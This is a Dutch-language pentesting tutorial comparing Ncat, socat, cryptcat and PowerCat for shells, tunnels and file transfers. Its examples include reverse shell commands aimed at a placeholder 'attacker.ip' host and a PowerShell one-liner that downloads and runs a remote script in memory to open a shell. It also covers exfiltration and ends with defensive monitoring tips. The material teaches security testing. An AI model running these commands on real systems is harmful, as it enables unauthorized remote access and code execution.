Ncat is de moderne herschikte versie van de legendarische Netcat-tool, ontwikkeld door het Nmap project. Het is een veelzijdige network connector voor reading, writing, redirecting en encrypting data over netwerken.
::

## 🔍 Wat Is Ncat?

Ncat is een **general-purpose command-line tool** voor het lezen, schrijven, redirecten en encrypteren van data over netwerken. Het is ontworpen als jouw **network Swiss Army knife** — geschikt voor interactive gebruik én als network-connected backend voor andere tools.

::note
Ncat is een **complete herimplementatie** van de oorspronkelijke Netcat (geschreven door Hobbit in 1996). Het deelt géén source code met het origineel, maar gebruikt in plaats daarvan Nmap's geoptimaliseerde en geteste networking libraries.
::

### 🎯 Waarom Ncat?

Ncat is waardevol omdat het:

| Eigenschap | Voordeel |
|-----------|----------|
| **Simpel & widespread** | Beschikbaar op de meeste systemen of makkelijk over te zetten |
| **Flexibel** | Client, listener, file transmitter, of te pipen naar andere programma's |
| **Scriptable** | Werkt uitstekend in shell scripts en one-liners |
| **Lightweight** | Kleine binary, minimale dependencies, draait op beperkte targets |

Voor pentesters maakt dit ncat ideaal voor:
- **Rapid reconnaissance**
- **Proof-of-concept exploitation**
- **Interactive shells** (reverse/bind)
- **File transfers**
- **Simple tunnels** tijdens engagements

::warning
**Legale waarschuwingen:**
- Gebruik deze tools uitsluitend op systemen waar je toestemming voor hebt
- Unauthorized access is illegaal (Computer Fraud and Abuse Act, CFAA)
- Gebruik alleen in geautoriseerde pentest engagements, CTFs, of je eigen lab
::

## 🔄 Netcat Variants — Wat Past Bij Jouw Use Case?

Er zijn **meerdere netcat-implementaties** met verschillende features. Hier is wanneer je welke gebruikt:

### 📡 Ncat (Nmap's versie) — Modern & Encrypted

**Wat het is:**
- De netcat implementatie die bij **Nmap** wordt geleverd
- Actief onderhouden met moderne features
- Voegt toe: **SSL/TLS, proxy support, IPv6, connection brokering**

**Waarom gebruiken:**
- Je wilt netcat-simpliciteit **+ sterke TLS encryption**
- Proxy support nodig (SOCKS4/5, HTTP)
- Integratie met Nmap toolkit

**Voorbeeld use cases:**
```bash
# Encrypted listener met TLS
ncat --ssl -l 4444 --ssl-cert server.pem --ssl-key server.key

# Encrypted reverse shell
ncat --ssl attacker.ip 4444 -e cmd.exe

# SOCKS5 proxy
ncat --proxy-type socks5 --proxy 127.0.0.1:1080 target 80
```

::tip
**Wanneer kiezen:** Use ncat wanneer je netcat-simpliciteit wilt **plus** TLS, proxy support, of Nmap compatibility.
::

---

### 🔧 Socat — The Swiss Army Data Relay

**Wat het is:**
- **Two-way data relay** tool — veel krachtiger dan netcat
- Kan vele endpoint types connecten: TCP, UDP, UNIX sockets, files, PTYs, SSL, en meer

**Waarom gebruiken:**
- **Complex tunnels** bouwen
- **Pseudo-terminals (PTY)** creëren voor interactive shells
- Port forwarding met TLS/SOCKS wrapping
- Bridge verschillende socket types

**Voorbeeld use cases:**
```bash
# Reverse shell met proper PTY op target
# Attacker:
socat -d -d TCP-LISTEN:4444 STDOUT

# Target:
socat TCP:attacker.ip:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# TLS client naar server
socat - OPENSSL:server:443,verify=0
```

**Real-world scenario:**
Je hebt een pivot host die een interne service alleen via een **UNIX domain socket** kan bereiken. Met socat forward je die UNIX socket naar jouw attacker machine over TCP, zodat je remote kunt interacten met de service.

::tip
**Wanneer kiezen:** Pick socat voor **advanced relays**, proper PTY shells, TLS wrapping, of wanneer je non-standard socket types moet bridgen.
::

---

### 🔐 Cryptcat — Encrypted Netcat (Legacy)

**Wat het is:**
- Oude versie van netcat met **twofish encryption** ingebouwd
- Niet meer actief onderhouden

**Waarom (niet) gebruiken:**
- ❌ **Verouderd** — gebruik liever `ncat --ssl`
- ❌ Zwakkere encryptie dan moderne TLS
- ✅ Kan nog steeds nuttig zijn in legacy omgevingen

```bash
# Encrypted listener (cryptcat)
cryptcat -l -p 4444

# Encrypted connection
cryptcat attacker.ip 4444
```

::caution
**Waarschuwing:** Cryptcat is **niet meer aanbevolen**. Gebruik `ncat --ssl` voor moderne encrypted connections.
::

---

### 💻 PowerCat — PowerShell Netcat for Windows

**Wat het is:**
- **PowerShell reimplementatie** van netcat
- Draait op Windows met PowerShell — geen compiled binaries nodig

**Waarom gebruiken:**
- Windows machines hebben **geen netcat by default**, maar wel PowerShell
- Bypass restrictions door geen `.exe` files te uploaden
- Operate **in-memory** zonder disk writes

**Voorbeeld use cases:**
```powershell
# Reverse shell van Windows target (PowerShell one-liner)
powershell -NoP -NonI -C "IEX(New-Object Net.WebClient).DownloadString('http://attacker/powercat.ps1'); Invoke-PowerCat -Reverse -Lhost attacker.ip -Lport 4444 -Exec cmd"

# Op attacker:
nc -l -p 4444  # Catch de shell
```

**Real-world scenario:**
Tijdens een Windows engagement krijg je code execution maar kun je geen binaries uploaden. Met PowerCat (geladen via web download of paste) creëer je een interactive shell **zonder een .exe op disk te laten**.

::tip
**Wanneer kiezen:** Use PowerCat wanneer het target **Windows** is en PowerShell beschikbaar is, vooral als je executable files wilt vermijden.
::

## 🎯 Waarom Pentesters en Attackers Ncat Gebruiken

Ncat (en variants) zijn essentieel in offensive security omdat ze:

### ✅ Simpele Network Pipes Maken
- **Interactive protocol debugging** (HTTP, SMTP, etc.)
- **Raw TCP/UDP connections** zonder overhead
- **Chain commands** via pipes

### ✅ Remote Access Enablen
- **Reverse shells** (bypass inbound firewall restrictions)
- **Bind shells** (direct access wanneer mogelijk)
- **Encrypted channels** (TLS voor stealth)

### ✅ File Transfers Faciliteren
- **Exfiltrate data** via simple TCP streams
- **Upload payloads** zonder FTP/SMB
- **Compress on-the-fly** (tar + ncat pipelines)

### ✅ Pivot & Relay
- **TCP relays** via compromised hosts
- **Proxy chains** voor multi-hop access
- **Connection brokering** voor NAT bypass

::important
**Defensive Perspective:**
Defenders monitoren op:
- Outbound connections naar onbekende IPs/poorten
- Processes met netcat-like behavior (raw sockets, listening ports)
- Unusual large uploads van workstations
- PowerShell spawning network connections
::
